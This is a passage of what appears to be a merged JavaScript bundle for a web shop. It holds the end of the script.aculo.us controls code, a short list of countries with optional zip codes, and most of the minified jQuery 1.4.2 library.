    keydown: 'checkForEscapeOrReturn',
    mouseover: 'enterHover',
    mouseout: 'leaveHover'
  }
});

Ajax.InPlaceCollectionEditor.DefaultOptions = {
  loadingCollectionText: 'Loading options...'
};

// Delayed observer, like Form.Element.Observer,
// but waits for delay after last key input
// Ideal for live-search fields

Form.Element.DelayedObserver = Class.create({
  initialize: function(element, delay, callback) {
    this.delay     = delay || 0.5;
    this.element   = $(element);
    this.callback  = callback;
    this.timer     = null;
    this.lastValue = $F(this.element);
    Event.observe(this.element,'keyup',this.delayedListener.bindAsEventListener(this));
  },
  delayedListener: function(event) {
    if(this.lastValue == $F(this.element)) return;
    if(this.timer) clearTimeout(this.timer);
    this.timer = setTimeout(this.onTimerEvent.bind(this), this.delay * 1000);
    this.lastValue = $F(this.element);
  },
  onTimerEvent: function() {
    this.timer = null;
    this.callback(this.element, $F(this.element));
  }
});
//<![CDATA[
optionalZipCountries = ["HK","IE","MO","PA"];
//]]>
/*!
 * jQuery JavaScript Library v1.4.2
 * http://jquery.com/
 *
 * Copyright 2010, John Resig
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * Includes Sizzle.js
 * http://sizzlejs.com/
 * Copyright 2010, The Dojo Foundation
 * Released under the MIT, BSD, and GPL Licenses.
 *
 * Date: Sat Feb 13 22:33:48 2010 -0500
 */
(function(A,w){function ma(){if(!c.isReady){try{s.documentElement.doScroll("left")}catch(a){setTimeout(ma,1);return}c.ready()}}function Qa(a,b){b.src?c.ajax({url:b.src,async:false,dataType:"script"}):c.globalEval(b.text||b.textContent||b.innerHTML||"");b.parentNode&&b.parentNode.removeChild(b)}function X(a,b,d,f,e,j){var i=a.length;if(typeof b==="object"){for(var o in b)X(a,o,b[o],f,e,d);return a}if(d!==w){f=!j&&f&&c.isFunction(d);for(o=0;o<i;o++)e(a[o],b,f?d.call(a[o],o,e(a[o],b)):d,j);return a}return i?
e(a[0],b):w}function J(){return(new Date).getTime()}function Y(){return false}function Z(){return true}function na(a,b,d){d[0].type=a;return c.event.handle.apply(b,d)}function oa(a){var b,d=[],f=[],e=arguments,j,i,o,k,n,r;i=c.data(this,"events");if(!(a.liveFired===this||!i||!i.live||a.button&&a.type==="click")){a.liveFired=this;var u=i.live.slice(0);for(k=0;k<u.length;k++){i=u[k];i.origType.replace(O,"")===a.type?f.push(i.selector):u.splice(k--,1)}j=c(a.target).closest(f,a.currentTarget);n=0;for(r=
j.length;n<r;n++)for(k=0;k<u.length;k++){i=u[k];if(j[n].selector===i.selector){o=j[n].elem;f=null;if(i.preType==="mouseenter"||i.preType==="mouseleave")f=c(a.relatedTarget).closest(i.selector)[0];if(!f||f!==o)d.push({elem:o,handleObj:i})}}n=0;for(r=d.length;n<r;n++){j=d[n];a.currentTarget=j.elem;a.data=j.handleObj.data;a.handleObj=j.handleObj;if(j.handleObj.origHandler.apply(j.elem,e)===false){b=false;break}}return b}}function pa(a,b){return"live."+(a&&a!=="*"?a+".":"")+b.replace(/\./g,"`").replace(/ /g,
"&")}function qa(a){return!a||!a.parentNode||a.parentNode.nodeType===11}function ra(a,b){var d=0;b.each(function(){if(this.nodeName===(a[d]&&a[d].nodeName)){var f=c.data(a[d++]),e=c.data(this,f);if(f=f&&f.events){delete e.handle;e.events={};for(var j in f)for(var i in f[j])c.event.add(this,j,f[j][i],f[j][i].data)}}})}function sa(a,b,d){var f,e,j;b=b&&b[0]?b[0].ownerDocument||b[0]:s;if(a.length===1&&typeof a[0]==="string"&&a[0].length<512&&b===s&&!ta.test(a[0])&&(c.support.checkClone||!ua.test(a[0]))){e=
true;if(j=c.fragments[a[0]])if(j!==1)f=j}if(!f){f=b.createDocumentFragment();c.clean(a,b,f,d)}if(e)c.fragments[a[0]]=j?f:1;return{fragment:f,cacheable:e}}function K(a,b){var d={};c.each(va.concat.apply([],va.slice(0,b)),function(){d[this]=a});return d}function wa(a){return"scrollTo"in a&&a.document?a:a.nodeType===9?a.defaultView||a.parentWindow:false}var c=function(a,b){return new c.fn.init(a,b)},Ra=A.jQuery,Sa=A.$,s=A.document,T,Ta=/^[^<]*(<[\w\W]+>)[^>]*$|^#([\w-]+)$/,Ua=/^.[^:#\[\.,]*$/,Va=/\S/,
Wa=/^(\s|\u00A0)+|(\s|\u00A0)+$/g,Xa=/^<(\w+)\s*\/?>(?:<\/\1>)?$/,P=navigator.userAgent,xa=false,Q=[],L,$=Object.prototype.toString,aa=Object.prototype.hasOwnProperty,ba=Array.prototype.push,R=Array.prototype.slice,ya=Array.prototype.indexOf;c.fn=c.prototype={init:function(a,b){var d,f;if(!a)return this;if(a.nodeType){this.context=this[0]=a;this.length=1;return this}if(a==="body"&&!b){this.context=s;this[0]=s.body;this.selector="body";this.length=1;return this}if(typeof a==="string")if((d=Ta.exec(a))&&
(d[1]||!b))if(d[1]){f=b?b.ownerDocument||b:s;if(a=Xa.exec(a))if(c.isPlainObject(b)){a=[s.createElement(a[1])];c.fn.attr.call(a,b,true)}else a=[f.createElement(a[1])];else{a=sa([d[1]],[f]);a=(a.cacheable?a.fragment.cloneNode(true):a.fragment).childNodes}return c.merge(this,a)}else{if(b=s.getElementById(d[2])){if(b.id!==d[2])return T.find(a);this.length=1;this[0]=b}this.context=s;this.selector=a;return this}else if(!b&&/^\w+$/.test(a)){this.selector=a;this.context=s;a=s.getElementsByTagName(a);return c.merge(this,
a)}else return!b||b.jquery?(b||T).find(a):c(b).find(a);else if(c.isFunction(a))return T.ready(a);if(a.selector!==w){this.selector=a.selector;this.context=a.context}return c.makeArray(a,this)},selector:"",jquery:"1.4.2",length:0,size:function(){return this.length},toArray:function(){return R.call(this,0)},get:function(a){return a==null?this.toArray():a<0?this.slice(a)[0]:this[a]},pushStack:function(a,b,d){var f=c();c.isArray(a)?ba.apply(f,a):c.merge(f,a);f.prevObject=this;f.context=this.context;if(b===
"find")f.selector=this.selector+(this.selector?" ":"")+d;else if(b)f.selector=this.selector+"."+b+"("+d+")";return f},each:function(a,b){return c.each(this,a,b)},ready:function(a){c.bindReady();if(c.isReady)a.call(s,c);else Q&&Q.push(a);return this},eq:function(a){return a===-1?this.slice(a):this.slice(a,+a+1)},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},slice:function(){return this.pushStack(R.apply(this,arguments),"slice",R.call(arguments).join(","))},map:function(a){return this.pushStack(c.map(this,
function(b,d){return a.call(b,d,b)}))},end:function(){return this.prevObject||c(null)},push:ba,sort:[].sort,splice:[].splice};c.fn.init.prototype=c.fn;c.extend=c.fn.extend=function(){var a=arguments[0]||{},b=1,d=arguments.length,f=false,e,j,i,o;if(typeof a==="boolean"){f=a;a=arguments[1]||{};b=2}if(typeof a!=="object"&&!c.isFunction(a))a={};if(d===b){a=this;--b}for(;b<d;b++)if((e=arguments[b])!=null)for(j in e){i=a[j];o=e[j];if(a!==o)if(f&&o&&(c.isPlainObject(o)||c.isArray(o))){i=i&&(c.isPlainObject(i)||
c.isArray(i))?i:c.isArray(o)?[]:{};a[j]=c.extend(f,i,o)}else if(o!==w)a[j]=o}return a};c.extend({noConflict:function(a){A.$=Sa;if(a)A.jQuery=Ra;return c},isReady:false,ready:function(){if(!c.isReady){if(!s.body)return setTimeout(c.ready,13);c.isReady=true;if(Q){for(var a,b=0;a=Q[b++];)a.call(s,c);Q=null}c.fn.triggerHandler&&c(s).triggerHandler("ready")}},bindReady:function(){if(!xa){xa=true;if(s.readyState==="complete")return c.ready();if(s.addEventListener){s.addEventListener("DOMContentLoaded",
L,false);A.addEventListener("load",c.ready,false)}else if(s.attachEvent){s.attachEvent("onreadystatechange",L);A.attachEvent("onload",c.ready);var a=false;try{a=A.frameElement==null}catch(b){}s.documentElement.doScroll&&a&&ma()}}},isFunction:function(a){return $.call(a)==="[object Function]"},isArray:function(a){return $.call(a)==="[object Array]"},isPlainObject:function(a){if(!a||$.call(a)!=="[object Object]"||a.nodeType||a.setInterval)return false;if(a.constructor&&!aa.call(a,"constructor")&&!aa.call(a.constructor.prototype,
"isPrototypeOf"))return false;var b;for(b in a);return b===w||aa.call(a,b)},isEmptyObject:function(a){for(var b in a)return false;return true},error:function(a){throw a;},parseJSON:function(a){if(typeof a!=="string"||!a)return null;a=c.trim(a);if(/^[\],:{}\s]*$/.test(a.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,"")))return A.JSON&&A.JSON.parse?A.JSON.parse(a):(new Function("return "+
a))();else c.error("Invalid JSON: "+a)},noop:function(){},globalEval:function(a){if(a&&Va.test(a)){var b=s.getElementsByTagName("head")[0]||s.documentElement,d=s.createElement("script");d.type="text/javascript";if(c.support.scriptEval)d.appendChild(s.createTextNode(a));else d.text=a;b.insertBefore(d,b.firstChild);b.removeChild(d)}},nodeName:function(a,b){return a.nodeName&&a.nodeName.toUpperCase()===b.toUpperCase()},each:function(a,b,d){var f,e=0,j=a.length,i=j===w||c.isFunction(a);if(d)if(i)for(f in a){if(b.apply(a[f],
d)===false)break}else for(;e<j;){if(b.apply(a[e++],d)===false)break}else if(i)for(f in a){if(b.call(a[f],f,a[f])===false)break}else for(d=a[0];e<j&&b.call(d,e,d)!==false;d=a[++e]);return a},trim:function(a){return(a||"").replace(Wa,"")},makeArray:function(a,b){b=b||[];if(a!=null)a.length==null||typeof a==="string"||c.isFunction(a)||typeof a!=="function"&&a.setInterval?ba.call(b,a):c.merge(b,a);return b},inArray:function(a,b){if(b.indexOf)return b.indexOf(a);for(var d=0,f=b.length;d<f;d++)if(b[d]===
a)return d;return-1},merge:function(a,b){var d=a.length,f=0;if(typeof b.length==="number")for(var e=b.length;f<e;f++)a[d++]=b[f];else for(;b[f]!==w;)a[d++]=b[f++];a.length=d;return a},grep:function(a,b,d){for(var f=[],e=0,j=a.length;e<j;e++)!d!==!b(a[e],e)&&f.push(a[e]);return f},map:function(a,b,d){for(var f=[],e,j=0,i=a.length;j<i;j++){e=b(a[j],j,d);if(e!=null)f[f.length]=e}return f.concat.apply([],f)},guid:1,proxy:function(a,b,d){if(arguments.length===2)if(typeof b==="string"){d=a;a=d[b];b=w}else if(b&&
!c.isFunction(b)){d=b;b=w}if(!b&&a)b=function(){return a.apply(d||this,arguments)};if(a)b.guid=a.guid=a.guid||b.guid||c.guid++;return b},uaMatch:function(a){a=a.toLowerCase();a=/(webkit)[ \/]([\w.]+)/.exec(a)||/(opera)(?:.*version)?[ \/]([\w.]+)/.exec(a)||/(msie) ([\w.]+)/.exec(a)||!/compatible/.test(a)&&/(mozilla)(?:.*? rv:([\w.]+))?/.exec(a)||[];return{browser:a[1]||"",version:a[2]||"0"}},browser:{}});P=c.uaMatch(P);if(P.browser){c.browser[P.browser]=true;c.browser.version=P.version}if(c.browser.webkit)c.browser.safari=
true;if(ya)c.inArray=function(a,b){return ya.call(b,a)};T=c(s);if(s.addEventListener)L=function(){s.removeEventListener("DOMContentLoaded",L,false);c.ready()};else if(s.attachEvent)L=function(){if(s.readyState==="complete"){s.detachEvent("onreadystatechange",L);c.ready()}};(function(){c.support={};var a=s.documentElement,b=s.createElement("script"),d=s.createElement("div"),f="script"+J();d.style.display="none";d.innerHTML="   <link/><table></table><a href='/a' style='color:red;float:left;opacity:.55;'>a</a><input type='checkbox'/>";
var e=d.getElementsByTagName("*"),j=d.getElementsByTagName("a")[0];if(!(!e||!e.length||!j)){c.support={leadingWhitespace:d.firstChild.nodeType===3,tbody:!d.getElementsByTagName("tbody").length,htmlSerialize:!!d.getElementsByTagName("link").length,style:/red/.test(j.getAttribute("style")),hrefNormalized:j.getAttribute("href")==="/a",opacity:/^0.55$/.test(j.style.opacity),cssFloat:!!j.style.cssFloat,checkOn:d.getElementsByTagName("input")[0].value==="on",optSelected:s.createElement("select").appendChild(s.createElement("option")).selected,
parentNode:d.removeChild(d.appendChild(s.createElement("div"))).parentNode===null,deleteExpando:true,checkClone:false,scriptEval:false,noCloneEvent:true,boxModel:null};b.type="text/javascript";try{b.appendChild(s.createTextNode("window."+f+"=1;"))}catch(i){}a.insertBefore(b,a.firstChild);if(A[f]){c.support.scriptEval=true;delete A[f]}try{delete b.test}catch(o){c.support.deleteExpando=false}a.removeChild(b);if(d.attachEvent&&d.fireEvent){d.attachEvent("onclick",function k(){c.support.noCloneEvent=
false;d.detachEvent("onclick",k)});d.cloneNode(true).fireEvent("onclick")}d=s.createElement("div");d.innerHTML="<input type='radio' name='radiotest' checked='checked'/>";a=s.createDocumentFragment();a.appendChild(d.firstChild);c.support.checkClone=a.cloneNode(true).cloneNode(true).lastChild.checked;c(function(){var k=s.createElement("div");k.style.width=k.style.paddingLeft="1px";s.body.appendChild(k);c.boxModel=c.support.boxModel=k.offsetWidth===2;s.body.removeChild(k).style.display="none"});a=function(k){var n=
s.createElement("div");k="on"+k;var r=k in n;if(!r){n.setAttribute(k,"return;");r=typeof n[k]==="function"}return r};c.support.submitBubbles=a("submit");c.support.changeBubbles=a("change");a=b=d=e=j=null}})();c.props={"for":"htmlFor","class":"className",readonly:"readOnly",maxlength:"maxLength",cellspacing:"cellSpacing",rowspan:"rowSpan",colspan:"colSpan",tabindex:"tabIndex",usemap:"useMap",frameborder:"frameBorder"};var G="jQuery"+J(),Ya=0,za={};c.extend({cache:{},expando:G,noData:{embed:true,object:true,
applet:true},data:function(a,b,d){if(!(a.nodeName&&c.noData[a.nodeName.toLowerCase()])){a=a==A?za:a;var f=a[G],e=c.cache;if(!f&&typeof b==="string"&&d===w)return null;f||(f=++Ya);if(typeof b==="object"){a[G]=f;e[f]=c.extend(true,{},b)}else if(!e[f]){a[G]=f;e[f]={}}a=e[f];if(d!==w)a[b]=d;return typeof b==="string"?a[b]:a}},removeData:function(a,b){if(!(a.nodeName&&c.noData[a.nodeName.toLowerCase()])){a=a==A?za:a;var d=a[G],f=c.cache,e=f[d];if(b){if(e){delete e[b];c.isEmptyObject(e)&&c.removeData(a)}}else{if(c.support.deleteExpando)delete a[c.expando];
else a.removeAttribute&&a.removeAttribute(c.expando);delete f[d]}}}});c.fn.extend({data:function(a,b){if(typeof a==="undefined"&&this.length)return c.data(this[0]);else if(typeof a==="object")return this.each(function(){c.data(this,a)});var d=a.split(".");d[1]=d[1]?"."+d[1]:"";if(b===w){var f=this.triggerHandler("getData"+d[1]+"!",[d[0]]);if(f===w&&this.length)f=c.data(this[0],a);return f===w&&d[1]?this.data(d[0]):f}else return this.trigger("setData"+d[1]+"!",[d[0],b]).each(function(){c.data(this,
a,b)})},removeData:function(a){return this.each(function(){c.removeData(this,a)})}});c.extend({queue:function(a,b,d){if(a){b=(b||"fx")+"queue";var f=c.data(a,b);if(!d)return f||[];if(!f||c.isArray(d))f=c.data(a,b,c.makeArray(d));else f.push(d);return f}},dequeue:function(a,b){b=b||"fx";var d=c.queue(a,b),f=d.shift();if(f==="inprogress")f=d.shift();if(f){b==="fx"&&d.unshift("inprogress");f.call(a,function(){c.dequeue(a,b)})}}});c.fn.extend({queue:function(a,b){if(typeof a!=="string"){b=a;a="fx"}if(b===
w)return c.queue(this[0],a);return this.each(function(){var d=c.queue(this,a,b);a==="fx"&&d[0]!=="inprogress"&&c.dequeue(this,a)})},dequeue:function(a){return this.each(function(){c.dequeue(this,a)})},delay:function(a,b){a=c.fx?c.fx.speeds[a]||a:a;b=b||"fx";return this.queue(b,function(){var d=this;setTimeout(function(){c.dequeue(d,b)},a)})},clearQueue:function(a){return this.queue(a||"fx",[])}});var Aa=/[\n\t]/g,ca=/\s+/,Za=/\r/g,$a=/href|src|style/,ab=/(button|input)/i,bb=/(button|input|object|select|textarea)/i,
cb=/^(a|area)$/i,Ba=/radio|checkbox/;c.fn.extend({attr:function(a,b){return X(this,a,b,true,c.attr)},removeAttr:function(a){return this.each(function(){c.attr(this,a,"");this.nodeType===1&&this.removeAttribute(a)})},addClass:function(a){if(c.isFunction(a))return this.each(function(n){var r=c(this);r.addClass(a.call(this,n,r.attr("class")))});if(a&&typeof a==="string")for(var b=(a||"").split(ca),d=0,f=this.length;d<f;d++){var e=this[d];if(e.nodeType===1)if(e.className){for(var j=" "+e.className+" ",
i=e.className,o=0,k=b.length;o<k;o++)if(j.indexOf(" "+b[o]+" ")<0)i+=" "+b[o];e.className=c.trim(i)}else e.className=a}return this},removeClass:function(a){if(c.isFunction(a))return this.each(function(k){var n=c(this);n.removeClass(a.call(this,k,n.attr("class")))});if(a&&typeof a==="string"||a===w)for(var b=(a||"").split(ca),d=0,f=this.length;d<f;d++){var e=this[d];if(e.nodeType===1&&e.className)if(a){for(var j=(" "+e.className+" ").replace(Aa," "),i=0,o=b.length;i<o;i++)j=j.replace(" "+b[i]+" ",
" ");e.className=c.trim(j)}else e.className=""}return this},toggleClass:function(a,b){var d=typeof a,f=typeof b==="boolean";if(c.isFunction(a))return this.each(function(e){var j=c(this);j.toggleClass(a.call(this,e,j.attr("class"),b),b)});return this.each(function(){if(d==="string")for(var e,j=0,i=c(this),o=b,k=a.split(ca);e=k[j++];){o=f?o:!i.hasClass(e);i[o?"addClass":"removeClass"](e)}else if(d==="undefined"||d==="boolean"){this.className&&c.data(this,"__className__",this.className);this.className=
this.className||a===false?"":c.data(this,"__className__")||""}})},hasClass:function(a){a=" "+a+" ";for(var b=0,d=this.length;b<d;b++)if((" "+this[b].className+" ").replace(Aa," ").indexOf(a)>-1)return true;return false},val:function(a){if(a===w){var b=this[0];if(b){if(c.nodeName(b,"option"))return(b.attributes.value||{}).specified?b.value:b.text;if(c.nodeName(b,"select")){var d=b.selectedIndex,f=[],e=b.options;b=b.type==="select-one";if(d<0)return null;var j=b?d:0;for(d=b?d+1:e.length;j<d;j++){var i=
e[j];if(i.selected){a=c(i).val();if(b)return a;f.push(a)}}return f}if(Ba.test(b.type)&&!c.support.checkOn)return b.getAttribute("value")===null?"on":b.value;return(b.value||"").replace(Za,"")}return w}var o=c.isFunction(a);return this.each(function(k){var n=c(this),r=a;if(this.nodeType===1){if(o)r=a.call(this,k,n.val());if(typeof r==="number")r+="";if(c.isArray(r)&&Ba.test(this.type))this.checked=c.inArray(n.val(),r)>=0;else if(c.nodeName(this,"select")){var u=c.makeArray(r);c("option",this).each(function(){this.selected=
c.inArray(c(this).val(),u)>=0});if(!u.length)this.selectedIndex=-1}else this.value=r}})}});c.extend({attrFn:{val:true,css:true,html:true,text:true,data:true,width:true,height:true,offset:true},attr:function(a,b,d,f){if(!a||a.nodeType===3||a.nodeType===8)return w;if(f&&b in c.attrFn)return c(a)[b](d);f=a.nodeType!==1||!c.isXMLDoc(a);var e=d!==w;b=f&&c.props[b]||b;if(a.nodeType===1){var j=$a.test(b);if(b in a&&f&&!j){if(e){b==="type"&&ab.test(a.nodeName)&&a.parentNode&&c.error("type property can't be changed");
a[b]=d}if(c.nodeName(a,"form")&&a.getAttributeNode(b))return a.getAttributeNode(b).nodeValue;if(b==="tabIndex")return(b=a.getAttributeNode("tabIndex"))&&b.specified?b.value:bb.test(a.nodeName)||cb.test(a.nodeName)&&a.href?0:w;return a[b]}if(!c.support.style&&f&&b==="style"){if(e)a.style.cssText=""+d;return a.style.cssText}e&&a.setAttribute(b,""+d);a=!c.support.hrefNormalized&&f&&j?a.getAttribute(b,2):a.getAttribute(b);return a===null?w:a}return c.style(a,b,d)}});var O=/\.(.*)$/,db=function(a){return a.replace(/[^\w\s\.\|`]/g,
function(b){return"\\"+b})};c.event={add:function(a,b,d,f){if(!(a.nodeType===3||a.nodeType===8)){if(a.setInterval&&a!==A&&!a.frameElement)a=A;var e,j;if(d.handler){e=d;d=e.handler}if(!d.guid)d.guid=c.guid++;if(j=c.data(a)){var i=j.events=j.events||{},o=j.handle;if(!o)j.handle=o=function(){return typeof c!=="undefined"&&!c.event.triggered?c.event.handle.apply(o.elem,arguments):w};o.elem=a;b=b.split(" ");for(var k,n=0,r;k=b[n++];){j=e?c.extend({},e):{handler:d,data:f};if(k.indexOf(".")>-1){r=k.split(".");
k=r.shift();j.namespace=r.slice(0).sort().join(".")}else{r=[];j.namespace=""}j.type=k;j.guid=d.guid;var u=i[k],z=c.event.special[k]||{};if(!u){u=i[k]=[];if(!z.setup||z.setup.call(a,f,r,o)===false)if(a.addEventListener)a.addEventListener(k,o,false);else a.attachEvent&&a.attachEvent("on"+k,o)}if(z.add){z.add.call(a,j);if(!j.handler.guid)j.handler.guid=d.guid}u.push(j);c.event.global[k]=true}a=null}}},global:{},remove:function(a,b,d,f){if(!(a.nodeType===3||a.nodeType===8)){var e,j=0,i,o,k,n,r,u,z=c.data(a),
C=z&&z.events;if(z&&C){if(b&&b.type){d=b.handler;b=b.type}if(!b||typeof b==="string"&&b.charAt(0)==="."){b=b||"";for(e in C)c.event.remove(a,e+b)}else{for(b=b.split(" ");e=b[j++];){n=e;i=e.indexOf(".")<0;o=[];if(!i){o=e.split(".");e=o.shift();k=new RegExp("(^|\\.)"+c.map(o.slice(0).sort(),db).join("\\.(?:.*\\.)?")+"(\\.|$)")}if(r=C[e])if(d){n=c.event.special[e]||{};for(B=f||0;B<r.length;B++){u=r[B];if(d.guid===u.guid){if(i||k.test(u.namespace)){f==null&&r.splice(B--,1);n.remove&&n.remove.call(a,u)}if(f!=
null)break}}if(r.length===0||f!=null&&r.length===1){if(!n.teardown||n.teardown.call(a,o)===false)Ca(a,e,z.handle);delete C[e]}}else for(var B=0;B<r.length;B++){u=r[B];if(i||k.test(u.namespace)){c.event.remove(a,n,u.handler,B);r.splice(B--,1)}}}if(c.isEmptyObject(C)){if(b=z.handle)b.elem=null;delete z.events;delete z.handle;c.isEmptyObject(z)&&c.removeData(a)}}}}},trigger:function(a,b,d,f){var e=a.type||a;if(!f){a=typeof a==="object"?a[G]?a:c.extend(c.Event(e),a):c.Event(e);if(e.indexOf("!")>=0){a.type=
e=e.slice(0,-1);a.exclusive=true}if(!d){a.stopPropagation();c.event.global[e]&&c.each(c.cache,function(){this.events&&this.events[e]&&c.event.trigger(a,b,this.handle.elem)})}if(!d||d.nodeType===3||d.nodeType===8)return w;a.result=w;a.target=d;b=c.makeArray(b);b.unshift(a)}a.currentTarget=d;(f=c.data(d,"handle"))&&f.apply(d,b);f=d.parentNode||d.ownerDocument;try{if(!(d&&d.nodeName&&c.noData[d.nodeName.toLowerCase()]))if(d["on"+e]&&d["on"+e].apply(d,b)===false)a.result=false}catch(j){}if(!a.isPropagationStopped()&&
f)c.event.trigger(a,b,f,true);else if(!a.isDefaultPrevented()){f=a.target;var i,o=c.nodeName(f,"a")&&e==="click",k=c.event.special[e]||{};if((!k._default||k._default.call(d,a)===false)&&!o&&!(f&&f.nodeName&&c.noData[f.nodeName.toLowerCase()])){try{if(f[e]){if(i=f["on"+e])f["on"+e]=null;c.event.triggered=true;f[e]()}}catch(n){}if(i)f["on"+e]=i;c.event.triggered=false}}},handle:function(a){var b,d,f,e;a=arguments[0]=c.event.fix(a||A.event);a.currentTarget=this;b=a.type.indexOf(".")<0&&!a.exclusive;
if(!b){d=a.type.split(".");a.type=d.shift();f=new RegExp("(^|\\.)"+d.slice(0).sort().join("\\.(?:.*\\.)?")+"(\\.|$)")}e=c.data(this,"events");d=e[a.type];if(e&&d){d=d.slice(0);e=0;for(var j=d.length;e<j;e++){var i=d[e];if(b||f.test(i.namespace)){a.handler=i.handler;a.data=i.data;a.handleObj=i;i=i.handler.apply(this,arguments);if(i!==w){a.result=i;if(i===false){a.preventDefault();a.stopPropagation()}}if(a.isImmediatePropagationStopped())break}}}return a.result},props:"altKey attrChange attrName bubbles button cancelable charCode clientX clientY ctrlKey currentTarget data detail eventPhase fromElement handler keyCode layerX layerY metaKey newValue offsetX offsetY originalTarget pageX pageY prevValue relatedNode relatedTarget screenX screenY shiftKey srcElement target toElement view wheelDelta which".split(" "),
fix:function(a){if(a[G])return a;var b=a;a=c.Event(b);for(var d=this.props.length,f;d;){f=this.props[--d];a[f]=b[f]}if(!a.target)a.target=a.srcElement||s;if(a.target.nodeType===3)a.target=a.target.parentNode;if(!a.relatedTarget&&a.fromElement)a.relatedTarget=a.fromElement===a.target?a.toElement:a.fromElement;if(a.pageX==null&&a.clientX!=null){b=s.documentElement;d=s.body;a.pageX=a.clientX+(b&&b.scrollLeft||d&&d.scrollLeft||0)-(b&&b.clientLeft||d&&d.clientLeft||0);a.pageY=a.clientY+(b&&b.scrollTop||
d&&d.scrollTop||0)-(b&&b.clientTop||d&&d.clientTop||0)}if(!a.which&&(a.charCode||a.charCode===0?a.charCode:a.keyCode))a.which=a.charCode||a.keyCode;if(!a.metaKey&&a.ctrlKey)a.metaKey=a.ctrlKey;if(!a.which&&a.button!==w)a.which=a.button&1?1:a.button&2?3:a.button&4?2:0;return a},guid:1E8,proxy:c.proxy,special:{ready:{setup:c.bindReady,teardown:c.noop},live:{add:function(a){c.event.add(this,a.origType,c.extend({},a,{handler:oa}))},remove:function(a){var b=true,d=a.origType.replace(O,"");c.each(c.data(this,
"events").live||[],function(){if(d===this.origType.replace(O,""))return b=false});b&&c.event.remove(this,a.origType,oa)}},beforeunload:{setup:function(a,b,d){if(this.setInterval)this.onbeforeunload=d;return false},teardown:function(a,b){if(this.onbeforeunload===b)this.onbeforeunload=null}}}};var Ca=s.removeEventListener?function(a,b,d){a.removeEventListener(b,d,false)}:function(a,b,d){a.detachEvent("on"+b,d)};c.Event=function(a){if(!this.preventDefault)return new c.Event(a);if(a&&a.type){this.originalEvent=
a;this.type=a.type}else this.type=a;this.timeStamp=J();this[G]=true};c.Event.prototype={preventDefault:function(){this.isDefaultPrevented=Z;var a=this.originalEvent;if(a){a.preventDefault&&a.preventDefault();a.returnValue=false}},stopPropagation:function(){this.isPropagationStopped=Z;var a=this.originalEvent;if(a){a.stopPropagation&&a.stopPropagation();a.cancelBubble=true}},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=Z;this.stopPropagation()},isDefaultPrevented:Y,isPropagationStopped:Y,
isImmediatePropagationStopped:Y};var Da=function(a){var b=a.relatedTarget;try{for(;b&&b!==this;)b=b.parentNode;if(b!==this){a.type=a.data;c.event.handle.apply(this,arguments)}}catch(d){}},Ea=function(a){a.type=a.data;c.event.handle.apply(this,arguments)};c.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(a,b){c.event.special[a]={setup:function(d){c.event.add(this,b,d&&d.selector?Ea:Da,a)},teardown:function(d){c.event.remove(this,b,d&&d.selector?Ea:Da)}}});if(!c.support.submitBubbles)c.event.special.submit=
{setup:function(){if(this.nodeName.toLowerCase()!=="form"){c.event.add(this,"click.specialSubmit",function(a){var b=a.target,d=b.type;if((d==="submit"||d==="image")&&c(b).closest("form").length)return na("submit",this,arguments)});c.event.add(this,"keypress.specialSubmit",function(a){var b=a.target,d=b.type;if((d==="text"||d==="password")&&c(b).closest("form").length&&a.keyCode===13)return na("submit",this,arguments)})}else return false},teardown:function(){c.event.remove(this,".specialSubmit")}};
if(!c.support.changeBubbles){var da=/textarea|input|select/i,ea,Fa=function(a){var b=a.type,d=a.value;if(b==="radio"||b==="checkbox")d=a.checked;else if(b==="select-multiple")d=a.selectedIndex>-1?c.map(a.options,function(f){return f.selected}).join("-"):"";else if(a.nodeName.toLowerCase()==="select")d=a.selectedIndex;return d},fa=function(a,b){var d=a.target,f,e;if(!(!da.test(d.nodeName)||d.readOnly)){f=c.data(d,"_change_data");e=Fa(d);if(a.type!=="focusout"||d.type!=="radio")c.data(d,"_change_data",
e);if(!(f===w||e===f))if(f!=null||e){a.type="change";return c.event.trigger(a,b,d)}}};c.event.special.change={filters:{focusout:fa,click:function(a){var b=a.target,d=b.type;if(d==="radio"||d==="checkbox"||b.nodeName.toLowerCase()==="select")return fa.call(this,a)},keydown:function(a){var b=a.target,d=b.type;if(a.keyCode===13&&b.nodeName.toLowerCase()!=="textarea"||a.keyCode===32&&(d==="checkbox"||d==="radio")||d==="select-multiple")return fa.call(this,a)},beforeactivate:function(a){a=a.target;c.data(a,
"_change_data",Fa(a))}},setup:function(){if(this.type==="file")return false;for(var a in ea)c.event.add(this,a+".specialChange",ea[a]);return da.test(this.nodeName)},teardown:function(){c.event.remove(this,".specialChange");return da.test(this.nodeName)}};ea=c.event.special.change.filters}s.addEventListener&&c.each({focus:"focusin",blur:"focusout"},function(a,b){function d(f){f=c.event.fix(f);f.type=b;return c.event.handle.call(this,f)}c.event.special[b]={setup:function(){this.addEventListener(a,
d,true)},teardown:function(){this.removeEventListener(a,d,true)}}});c.each(["bind","one"],function(a,b){c.fn[b]=function(d,f,e){if(typeof d==="object"){for(var j in d)this[b](j,f,d[j],e);return this}if(c.isFunction(f)){e=f;f=w}var i=b==="one"?c.proxy(e,function(k){c(this).unbind(k,i);return e.apply(this,arguments)}):e;if(d==="unload"&&b!=="one")this.one(d,f,e);else{j=0;for(var o=this.length;j<o;j++)c.event.add(this[j],d,i,f)}return this}});c.fn.extend({unbind:function(a,b){if(typeof a==="object"&&
!a.preventDefault)for(var d in a)this.unbind(d,a[d]);else{d=0;for(var f=this.length;d<f;d++)c.event.remove(this[d],a,b)}return this},delegate:function(a,b,d,f){return this.live(b,d,f,a)},undelegate:function(a,b,d){return arguments.length===0?this.unbind("live"):this.die(b,null,d,a)},trigger:function(a,b){return this.each(function(){c.event.trigger(a,b,this)})},triggerHandler:function(a,b){if(this[0]){a=c.Event(a);a.preventDefault();a.stopPropagation();c.event.trigger(a,b,this[0]);return a.result}},
